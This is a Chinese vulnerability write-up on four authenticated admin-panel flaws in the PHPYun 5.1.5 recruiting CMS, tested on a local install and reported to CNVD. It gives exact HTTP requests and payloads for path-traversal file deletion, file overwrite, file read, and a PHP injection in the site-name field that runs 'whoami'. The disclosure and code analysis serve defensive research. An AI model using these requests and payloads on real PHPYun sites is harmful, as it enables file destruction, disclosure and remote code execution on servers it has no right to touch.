**发布这篇文章的时候，貌似更新到6.x.x版了？但不知道修复没有，不过涉及漏洞均已提交 `CNVD`**

环境搭建
----

源码下载：<https://www.phpyun.com/bbs/thread-16786-1-1.html>  
正常安装即可  
本地搭建应用的地址为 <http://www.phpyun515.com/>

phpyun防御简析
----------

可能是笔者实力实在是太菜了，主要还是围绕着后台的漏洞进行挖掘，前台看得也比较少。而且不得不说`phpyun`对于 `sql`注入的过滤的还是比较好的，因此也没有挖掘到 `SQL`的漏洞。  
`admin/index.php`，加载了 `config/db.safety.php`（`global.php`中加载）  
在 159行左右，执行 `quotesGPC`函数  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0864628cc0fddb84d4555bde83c91490ab07f830.png)  
`$_GET`，`$_POST`，`$_COOKIE`都由 `addSlash`处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9550ad000479a346f20df3e629a3a5f7c2684846.png)  
这个是很基本的操作，但是也很有效  
在之后，又有另外一手操作 `common_htmlspecialchars` （加载他的代码太长，没有贴出来）  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-20a89863b3b7bd15d7e9e9147deef6c962d749bb.png)  
过滤了 `00`等，然后又有 `strip_tags`，`gpc2sql`，我们来看看 `gpc2sql`函数  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-59eb2a7f174e079ab8f87523bdd6833a5ebae539.png)  
这里将一些关键字全部替换了，像单引号双引号括号这些，直接替换成了中文的，没有括号这些，连代码执行都很难搞了。  
好了，防御部分代码就说到这里了

漏洞目录
----

- 后台任意文件删除漏洞
- 后台任意文件写入漏洞
- 后台命令执行漏洞
- 后台任意文件读取漏洞

都是需要登录后台 [http://www.phpyun515.com/admin/index.php](http://www.phpyun515.com/)  
默认账号密码为 `admin / admin`

后台任意文件删除漏洞
----------

### 漏洞复现

按照如下选择

```php
工具 -> 数据 -> 数据库管理 -> 备份数据
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a59b198fc1517ef9f37a97601ecb88db6deba6a0.png)

备份一个数据（也可跳过，直接去之后的发包，这里只是为了有数据可以删除）  
备份后来到 恢复数据，点击删除并抓包  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c5b2d702f1a6a0fabfb42e0aa8793291a7fa98a0.png)  
修改 `get` 中的 `sql`参数为自己想要删除的目录位置，可以使用 `../`，这里为了显示测试效果，已经在 `www`下建立好了测试文件夹  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-606b110f9ff05fda8814a3c5932617d2f18352a1.png)

正常的删除路径如下，是图中的 `phpyun_phpyun_ad_20211023220840`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4790054c99b5854879e13118e44ee8cdbe5e9011.png)  
因此我们构造 `sql=../../../../../test` 发包  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-efcb6c3f66fa6635510f381c9a920c26f695298d.png)  
我们再来看看 `WWW`文件夹  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-416c6f725fba928a30bc009a63ee9694cdcb585b.png)  
整个 `test`文件夹与其下文件都被删除

### 漏洞分析

先来看看路由，我们看到 `/admin/index.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a582fc87ec9bd5b05e42065105d5a64b7de78281.png)  
由 `m`以及 `c`控制使用的 `controller`与 `action`，在 `POC`中 `m=database&c=del`，因此我们访问的是 `admin`下的 `model/database.class.php`中的 `del_action` ，我们来看看处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-19cc260939a3a76d833db2575c08590e8e1bdb62.png)  
首先会 `check_token`，这个好说，就是检查 `token`，也就是 `pytoken=de1c3e777158`，只要是正常从删除数据库备份那里过来的都可以得到这样的 `token`，接着看

```php
$handle = opendir(PLUS_PATH.'/bdata/'.$_GET['sql']);
```

直接拼接了 `$_GET['sql']`到 `PLUS_PATH.'/bdata/'`后面，这里就是漏洞的来源，实际上这个 `$_GET`在前面是有统一处理的，但没有过滤 `../`这些字符，因此能造成一个目录穿越，接下来的代码就简单了，循环读取目录下的文件，拼接在后面，然后 `unlink`删除，最后删除整个文件夹，因此造成了本漏洞。

后台任意文件写入漏洞
----------

### 漏洞复现

按照如下选择

```php
工具 -> 生成 -> 首页生成
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9084e381538e5e099d29a310519f63a2c998a7a0.png)  
将首页保存路径修改为任意路径，即可生成首页，如果文件存在，那么将覆盖文件，可以达到任意文件覆盖的效果  
这里先将 `index.php`备份为 `index.php.bak` ，注意 `index.php`的大小，此时只有 `2KB`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0fdbd2bb8f4f54cc33d1b8fc9a194b57f9985a0d.png)  
将首页保存位置（也就是 `make_index_url`）设置为 `../index.php`，然后发包  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2d3937f7687f1f3ea8ef78653115597a9c20a98d.png)  
此时查看 `index.php`，已经变成了 `40KB`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b7d00cc8676eb12db09282078ff7fc7ce0ce5b04.png)  
此时可以将 `index.php`与备份文件 `index.php.bak` 进行比对  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4dbbd6f0f6b3422c8f40246574d36fc6358d19d2.png)  
已经完全不一样了，此时就达到了任意文件覆盖的目的

### 漏洞分析

先来看看路由，我们看到 `/admin/index.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a582fc87ec9bd5b05e42065105d5a64b7de78281.png)  
由 `m`以及 `c`控制使用的 `controller`与 `action`，在 `POC`中 `m=cache&c=index`，因此我们访问的是 `admin`下的 `model/cache.class.php`中的 `index_action` ，我们来看看处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-825cac6917140e7b7784a8f4bf2b89f9e3677037.png)  
默认的配置明显没有开启分站，因此我们直接看到 `else`语句，跟进 `$this->webindex($_POST['make_index_url']);`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8a4f41038564409a50e9feee3c75ff8e83e5acef.png)  
前面都是在设置一些参数值，因此可以跳过，我们来到最后，打开 `$path`，将`$content`写入进去了，这里的 `$path`就是我们 `POST`的 `make_index_url`，在这里没有经过其他的处理，因此是我们可控的，并且以相对路径读取，所以是可以目录穿越的，因此我们可以达到覆盖任意文件的效果。

后台命令执行漏洞
--------

### 漏洞复现

#### 步骤一

按照如下选择

```php
系统 -> 设置 -> 网站设置 -> 基本设置
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4d4ad0e9fbac6b1acc598933657b6d6599baff72.png)  
将网站名称修改为

```php
<?php echo `whoami`;?>
```

然后保存，保存后，如图所示  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9500371b0d4091172a2c8e20a1300f50bad829f7.png)

#### 步骤二

按照如下选择

```php
工具 -> 生成 -> 首页生成
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db4770e00334368246bbb3bb1bce90e5aafe62a2.png)  
更改首页保存路径为 `../aaa.php` 即可在网站根目录生成 `aaa.php`  
访问 <http://www.phpyun515.com/aaa.php>  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-390161c9e0b755b4cb3520647e72d14597384989.png)

可以看到已经执行了命令

### 漏洞分析

#### 步骤一

更改基本设置抓包得到

```http
POST /admin/index.php?m=config&c=save HTTP/1.1
Host: www.phpyun515.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1411
Origin: http://www.phpyun515.com
Connection: close
Referer: http://www.phpyun515.com/admin/index.php?m=config
Cookie: PHPSESSID=uje27rm43mjsqd2a8q5se7t5p3; lasttime=1634997649; ashell=426baa111758bda8ca6191308815b762; XDEBUG_SESSION=PHPSTORM

config=%E6%8F%90%E4%BA%A4&sy_webname=%3C%3Fphp+echo+%60whoami%60%3B+%3F%3E&sy_weburl=http%3A%2F%2Fwww.phpyun515.com&sy_webkeyword=phpyun%E4%BA%BA%E6%89%8D%E7%BD%91%2Cphpyun%E6%8B%9B%E8%81%98%E7%BD%91%2Cphpyun%E6%B1%82%E8%81%8C%2Cphpyun%E6%8B%9B%E8%81%98%E4%BC%9A%2C&sy_webmeta=PHP%E4%BA%91%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F%EF%BC%8C%E6%98%AF%E4%B8%93%E4%B8%BA%E4%B8%AD%E6%96%87%E7%94%A8%E6%88%B7%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%BC%80%E5%8F%91%EF%BC%8C%E7%A8%8B%E5%BA%8F%E6%BA%90%E4%BB%A3%E7%A0%81100%25%E5%AE%8C%E5%85%A8%E5%BC%80%E6%94%BE%E7%9A%84%E4%B8%80%E4%B8%AA%E9%87%87%E7%94%A8+PHP+%E5%92%8C+MySQL+%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%84%E5%BB%BA%E7%9A%84%E9%AB%98%E6%95%88%E7%9A%84%E4%BA%BA%E6%89%8D%E4%B8%8E%E4%BC%81%E4%B8%9A%E6%B1%82%E8%81%8C%E6%8B%9B%E3%80%81%E8%81%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%82&sy_webcopyright=Copyright+C+20092014+All+Rights+Reserved+%E7%89%88%E6%9D%83%E6%89%80%E6%9C%89+%E9%91%AB%E6%BD%AE%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E6%9C%8D%E5%8A%A1&sy_webtongji=&sy_webemail=admin%40admin.com&sy_webmoblie=1586XXXX875&sy_webrecord=%E8%8B%8FICP%E5%A4%8712049413%E5%8F%B7-3&sy_websecord=&sy_perfor=&sy_hrlicense=&sy_webtel=XXXX-836XXXXX&sy_qq=33673652&sy_freewebtel=400-880-XXXX&sy_worktime=&sy_listnum=10&sy_webadd=&sy_webclose=%E7%BD%91%E7%AB%99%E5%8D%87%E7%BA%A7%E4%B8%AD%E8%AF%B7%E8%81%94%E7%B3%BB%E7%AE%A1%E7%90%86%E5%91%98%EF%BC%81&sy_web_online=1&pytoken=de1c3e777158
```

这里可以知道，我们访问的是 `/admin/index.php?m=config&c=save` 并且写入的命令参数为 `sy_webname`  
先来看看路由，我们看到 `/admin/index.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a582fc87ec9bd5b05e42065105d5a64b7de78281.png)  
由 `m`以及 `c`控制使用的 `controller`与 `action`，在 `POC`中 `m=config&c=save`，因此我们访问的是 `admin`下的 `model/config.class.php`中的 `save_action` ，我们来看看处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6834eb9776c66fd153e6ceeb864b095d6d4ad01d.png)  
从上面的包来看，明显 `config`不为 `uploadconfig`，因此跳过这个 `if`语句，来到下面  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2b45a1498906a8532434abbd70c64b0891a02d91.png)  
首先 `unset`了 `config`与 `pytoken`的值，然后一些赋值，最后获取了 `config`的 `model`，然后将整个 `$_POST`放入 `setConfig`，我们跟进看看，位于 `app/model/config.model.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b4c151b4ed2201c13e324c897c64c200951ebd2c.png)  
首先使用 `select_all`查询 `admin_config`表中的值，这是数据库 `model`这个父类实现的方法  
然后遍历 `$config`获取所有的 `name`放入 `alllist` ，下面的就是遍历了 `$data`也就是上文的 `$_POST`，获取他的键，在 `alllist`中存在就更新，不存在就添加，我们跟进这个 `upInfo`来看看  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a2e6cbe0f9ce9fb3fa9d0b53fc1d0755260ff219.png)  
`update_once` 也是数据库 `model`这个父类实现的方法，更新 `admin_config`的内容，因此我们写入命令执行的 `sy_webname` 也被写入了数据库，我们可以在数据库中看到，`phpyun_`是表前缀  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b9d8ce78c0843c19e725a659b3d7d44807de8f66.png)

#### 步骤二

生成首页步骤抓包可得

```http
POST /admin/index.php?m=cache&c=index HTTP/1.1
Host: www.phpyun515.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://www.phpyun515.com
Connection: close
Referer: http://www.phpyun515.com/admin/index.php?m=cache&c=index
Cookie: PHPSESSID=uje27rm43mjsqd2a8q5se7t5p3; lasttime=1634997649; ashell=426baa111758bda8ca6191308815b762; XDEBUG_SESSION=PHPSTORM
Upgrade-Insecure-Requests: 1

make_index_url=..%2Faaa.php&madeall=%E6%9B%B4%E6%96%B0%E9%A6%96%E9%A1%B5&pytoken=de1c3e777158
```

`admin/index.php`部分在上面讲了，我们直接来到 `admin`下的 `model/cache.class.php`中的 `index_action` ，我们来看看处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27381060dd2288e39f05dc0bf90f9f2bd6c717a3.png)  
首先是获取了一个 `config`的 `model`，在 `post`了 `madeall`，并且 `$this->config['sy_web_site']`默认不为 1的情况下，我们会进入 `else`语句，我们跟进 `$this->webindex`，参数为我们 `post`上来的路径，没有任何过滤，我们完全可控  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-38beabe0d57f1222eac69f30f3fd93363c5f50fe.png)  
这里可以直接看到下面几句，`$content`是由 `$phpyun->fetch` 得到，然后被写到我们能控制的 `$path`中去，所以我们只需要能控制 `$content`就可以，我们来看看 `fetch`的模板 `phpyun/app/template/default/index/index.htm` 的内容  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91d03c61fcb5fdc39bff5de784287ac040d660e8.png)  
我们跟进这个 `fetch`，这里就主要是 `smarty`的渲染部分，有点多，主要讲一下与本漏洞有关的部分  
来到 `app/include/libs/sysplugins/smarty_internal_templatebase.php`  
这里涉及到 `smarty`模板的编译，`phpyun`也许加了些自己的东西，但整体是差不多的，就是将上面图片的模板给编译，将标签，比如 `{yun:}$title{/yun}`变成 `php`代码，过程跳过，直接来到结果  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-854e7a4ddf45495e685fa790bbf1903a68cec7a2.png)  
编译后的代码被写入文件，然后被包含，图片中已经圈出来了路径，我们来看看编译后的文件  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-407fc14fd90f5560f584d197deebb05c43e03792.png)  
之前的 `$title`变成了图中的 `$_smarty_tpl->tpl_vars['title']->value`，而这个 `tpl_vars['title']` 是从 `$phpyun`中传过来的，我们调试可以看到如下  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0769d65afd975535e6709b1122a2472c784394ae.png)  
这个 `title` 的 `value`中就包含了我们步骤一中可控的 `sy_webname` ，因此 `title`可控，然后被写入编译后的模板，之后被 `include`包含执行，因此带有 `<?php echo`whoami`;?>`的字符串被输出到模板中，然后被我们利用步骤二写入到 `aaa.php`文件，因此可以命令执行。  
这里值得一提的是，`phpyun`中存在一些过滤代码，不能使用括号，目前只能使用 ```` 执行命令

后台任意文件读取漏洞
----------

### 漏洞复现

#### 步骤一

按照如下选择

```php
系统 -> 设置 -> 网站设置 -> 基本设置

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4d4ad0e9fbac6b1acc598933657b6d6599baff72.png)  
将网站地址修改为 `.` ，然后保存，保存后，如图所示  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-639e45fe01bff14fb238c14d407a833c36db40cd.png)

#### 步骤二

直接发包，可以读取 `php`文件

```http
GET /admin/index.php?m=database&c=down_sql&name=../../../qqlogin.php HTTP/1.1
Host: www.phpyun515.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://www.phpyun515.com/admin/index.php
Cookie: PHPSESSID=uje27rm43mjsqd2a8q5se7t5p3; XDEBUG_SESSION=PHPSTORM

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-51c32e401968f4b5267195b4874714c21a8821a4.png)

### 漏洞分析

#### 步骤一

更改基本设置抓包得到

```http
POST /admin/index.php?m=config&c=save HTTP/1.1
Host: www.phpyun515.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1411
Origin: http://www.phpyun515.com
Connection: close
Referer: http://www.phpyun515.com/admin/index.php?m=config
Cookie: PHPSESSID=uje27rm43mjsqd2a8q5se7t5p3; lasttime=1634997649; ashell=426baa111758bda8ca6191308815b762; XDEBUG_SESSION=PHPSTORM

config=%E6%8F%90%E4%BA%A4&sy_webname=hr人才网&sy_weburl=.&sy_webkeyword=phpyun%E4%BA%BA%E6%89%8D%E7%BD%91%2Cphpyun%E6%8B%9B%E8%81%98%E7%BD%91%2Cphpyun%E6%B1%82%E8%81%8C%2Cphpyun%E6%8B%9B%E8%81%98%E4%BC%9A%2C&sy_webmeta=PHP%E4%BA%91%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F%EF%BC%8C%E6%98%AF%E4%B8%93%E4%B8%BA%E4%B8%AD%E6%96%87%E7%94%A8%E6%88%B7%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%BC%80%E5%8F%91%EF%BC%8C%E7%A8%8B%E5%BA%8F%E6%BA%90%E4%BB%A3%E7%A0%81100%25%E5%AE%8C%E5%85%A8%E5%BC%80%E6%94%BE%E7%9A%84%E4%B8%80%E4%B8%AA%E9%87%87%E7%94%A8+PHP+%E5%92%8C+MySQL+%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%84%E5%BB%BA%E7%9A%84%E9%AB%98%E6%95%88%E7%9A%84%E4%BA%BA%E6%89%8D%E4%B8%8E%E4%BC%81%E4%B8%9A%E6%B1%82%E8%81%8C%E6%8B%9B%E3%80%81%E8%81%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%82&sy_webcopyright=Copyright+C+20092014+All+Rights+Reserved+%E7%89%88%E6%9D%83%E6%89%80%E6%9C%89+%E9%91%AB%E6%BD%AE%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E6%9C%8D%E5%8A%A1&sy_webtongji=&sy_webemail=admin%40admin.com&sy_webmoblie=1586XXXX875&sy_webrecord=%E8%8B%8FICP%E5%A4%8712049413%E5%8F%B7-3&sy_websecord=&sy_perfor=&sy_hrlicense=&sy_webtel=XXXX-836XXXXX&sy_qq=33673652&sy_freewebtel=400-880-XXXX&sy_worktime=&sy_listnum=10&sy_webadd=&sy_webclose=%E7%BD%91%E7%AB%99%E5%8D%87%E7%BA%A7%E4%B8%AD%E8%AF%B7%E8%81%94%E7%B3%BB%E7%AE%A1%E7%90%86%E5%91%98%EF%BC%81&sy_web_online=1&pytoken=de1c3e777158

```

这里可以知道，我们访问的是 `/admin/index.php?m=config&c=save`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a582fc87ec9bd5b05e42065105d5a64b7de78281.png)  
由 `m`以及 `c`控制使用的 `controller`与 `action`，在 `POC`中 `m=config&c=save`，因此我们访问的是 `admin`下的 `model/config.class.php`中的 `save_action` ，我们来看看处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6834eb9776c66fd153e6ceeb864b095d6d4ad01d.png)  
从上面的包来看，明显 `config`不为 `uploadconfig`，因此跳过这个 `if`语句，来到下面  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2b45a1498906a8532434abbd70c64b0891a02d91.png)  
首先 `unset`了 `config`与 `pytoken`的值，然后一些赋值，最后获取了 `config`的 `model`，然后将整个 `$_POST`放入 `setConfig`，我们跟进看看，位于 `app/model/config.model.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b4c151b4ed2201c13e324c897c64c200951ebd2c.png)  
首先使用 `select_all`查询 `admin_config`表中的值，这是数据库 `model`这个父类实现的方法  
然后遍历 `$config`获取所有的 `name`放入 `alllist` ，下面的就是遍历了 `$data`也就是上文的 `$_POST`，获取他的键，在 `alllist`中存在就更新，不存在就添加。  
返回上一步，`setconfig`后判断验证字符，正常情况下进入 `$this->web_config()`，跟进看看，来到 `app/public/common.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8cd496482c6dc29061b61c37a068005274f1fadb.png)  
在这里，会获取 `config`的数据库对象，然后获取其键值对，存入 `$configarr`，不为空就进入 `made_web`，跟进，位于 `app/include/public.function.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c1c7bb97ff80de79145983fcadd25e9aa1d71875.png)  
这里是将 `config`的键值对写入了 `data/plus/config.php`文件，我们看看内容  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bdfa83b9dda3c84872f4e9ca0698da2108dd645b.png)

#### 步骤二

读取文件步骤抓包可得

```http
GET /admin/index.php?m=database&c=down_sql&name=../../../qqlogin.php HTTP/1.1
Host: www.phpyun515.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://www.phpyun515.com/admin/index.php
Cookie: PHPSESSID=uje27rm43mjsqd2a8q5se7t5p3; XDEBUG_SESSION=PHPSTORM

```

`admin/index.php`部分在上面讲了，我们直接来到 `admin`下的 `model/database.class.php`中的 `down_sql_action` ，我们来看看处理  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cc7ca5df354ee3df49a0779553b3dfb5ec1465af.png)  
这里获取 `$this->config[sy_weburl]`，然后拼接了 `/data/backup/$_GET[name]`，`$_GET[name]`可控，并且没有过滤掉 `../`，关键是在于 `$this->config[sy_weburl]`，我们看看这个 `config`是如何获取的，直接定位 `$this->config`的位置，发现存在于 `app/public/common.php`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2c3abffad80f102cfcd6c2db19cf21e1c7758d54.png)  
可以看到是由 `global $config`得到的，我们再次定位，发现是在 `admin/index.php`中调用了 `global.php`文件，而在 `global.php`直接包含了 `data/plus/config.php`获得了变量 `$config`  
![image.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-053892fbeab45fe6617cbaad3ae961b8cde5ddc0.png)  
所有 `$this->config`是由 `$config`得到的，而我们在网站后台可以控制`$config`内容。原本的 `sy_weburl`是网站链接，因此只会读取网站中的内容，而我们通过改变 `sy_weburl` 为 `.`，就可以实现任意文件读取。

总结
--

总的一句，还是自己太菜，没有挖掘到前台的洞，再啰嗦一句，命令执行那个洞，没法使用括号等，只能用 ``` 。如果有了编号，再给补上吧，不过文件删除那个洞 CNVD说我撞洞了，个人认为是没有撞洞的。文中漏洞均已提交 CNVD